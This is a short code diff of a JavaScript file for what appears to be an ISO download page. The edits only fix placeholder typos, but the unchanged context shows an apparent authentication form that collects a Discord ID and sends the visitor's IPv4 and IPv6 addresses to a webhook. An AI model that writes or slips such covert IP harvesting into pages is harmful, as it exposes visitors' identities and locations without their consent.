@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
   const isoFiles = [
-    { name: 'comming soon', size: '？', url: 'comming soon' },
-    { name: 'comming soon', size: '？', url: 'comming soon' }
+    { name: 'Coming Soon', size: '?', url: 'coming-soon' },
+    { name: 'Coming Soon', size: '?', url: 'coming-soon' }
   ];
 
   const isoList = document.getElementById('iso-list');
@@ -21,6 +21,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const discordID = document.getElementById('discord-id').value;
 
     const ipData = await getIPAddresses();
+
     sendToWebhook(discordID, ipData.ipv4, ipData.ipv6);
 
     authForm.style.display = 'none';
